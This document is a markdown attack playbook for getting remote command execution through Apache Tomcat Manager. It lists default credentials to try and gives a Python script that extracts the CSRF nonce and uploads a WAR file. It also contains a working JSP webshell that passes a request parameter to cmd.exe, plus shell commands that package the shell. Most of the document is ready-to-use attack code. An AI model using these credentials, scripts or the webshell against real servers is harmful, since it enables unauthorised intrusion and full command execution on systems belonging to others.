# Tomcat Manager RCE via WAR Deploy

## When to Use
- Tomcat Manager accessible (401 on /manager/html, not 403)
- Default or weak creds found (tomcat:tomcat, admin:admin, tomcat:s3cret)

## Key Insight: manager-gui vs manager-script
- `manager-gui` role: access to HTML GUI only (/manager/html)
- `manager-script` role: access to text API (/manager/text/deploy)
- Many setups only grant `manager-gui` — text deploy returns 403
- HTML deploy requires CSRF nonce extraction + multipart form upload

## Default Credentials to Test
```
tomcat:tomcat
admin:admin
tomcat:s3cret
admin:s3cret
admin:password
tomcat:password
role1:tomcat
both:tomcat
```

## HTML Manager Deploy (Python — handles CSRF correctly)
```python
import requests, re

s = requests.Session()
s.auth = ('tomcat', 'tomcat')
s.verify = False

# Get fresh CSRF nonce (must use same session)
r = s.get('http://TARGET:8080/manager/html')
m = re.search(r'CSRF_NONCE=([A-F0-9]+)', r.text)
nonce = m.group(1)

# Deploy WAR (same session maintains CSRF validity)
url = f'http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={nonce}'
with open('shell.war', 'rb') as f:
    r2 = s.post(url, files={'deployWar': ('shell.war', f, 'application/octet-stream')})

if '/shell' in r2.text:
    print('DEPLOYED')
```

## Minimal JSP Webshell (Windows)
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) { out.println(line); }
}
%>
```

## WAR Creation (no msfvenom needed)
```bash
mkdir -p webshell/WEB-INF
# Create cmd.jsp (above)
cat > webshell/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0">
  <display-name>cmd</display-name>
</web-app>
EOF
cd webshell && jar -cf ../shell.war .
```

## Pitfalls
- CSRF nonce expires between requests — MUST use single session object
- curl-based deploy fails because nonce is tied to cookie/session state
- Text interface (/manager/text/) requires manager-script role separately
- Tomcat 9.0.0.M9 is vulnerable to CVE-2017-12617 (PUT JSP upload) if readonly=false
- URL-encode spaces as + in webshell commands, special chars as %XX
